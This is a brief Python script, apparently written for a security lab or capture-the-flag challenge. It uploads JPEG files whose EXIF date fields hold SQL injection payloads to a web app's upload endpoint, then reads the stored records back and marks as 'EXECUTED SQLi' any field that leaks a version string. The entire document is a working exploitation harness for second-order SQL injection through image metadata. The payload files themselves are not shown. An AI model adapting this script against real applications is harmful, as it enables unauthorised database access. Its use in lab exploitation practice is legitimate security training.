# upload_deep.py — upload d_*.jpg (raw-written date payloads) and detect execution (3.x version).
import requests, base64, glob, re, os
BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID  = "ea42cd39-001b-4fb5-a509-449322674687"
verre = re.compile(r"3\.\d+\.\d+")

files = sorted(glob.glob("d_*.jpg"))
sent = {}
for f in files:
    m = os.path.splitext(f)[0]
    uri = "data:image/jpeg;base64," + base64.b64encode(open(f,"rb").read()).decode()
    r = requests.post(f"{BASE}/upload", json={"image":uri,"description":m,"user_id":UID})
    sent[m]=r.status_code
    print(f"{f:16} -> {r.status_code}  {r.text[:50].strip()}")

print("\n--- readback (version string = SQLi executed) ---")
data = requests.get(f"{BASE}/images/{UID}").json()
for img in data:
    if img.get("description") in sent:
        flds = {k: img.get(k) for k in ("make","model","datetime","summary_ocr")}
        hit = any(verre.search(str(v)) for v in flds.values())
        print(f"{img['description']:10} {flds}" + ("   <<<<< EXECUTED SQLi" if hit else ""))
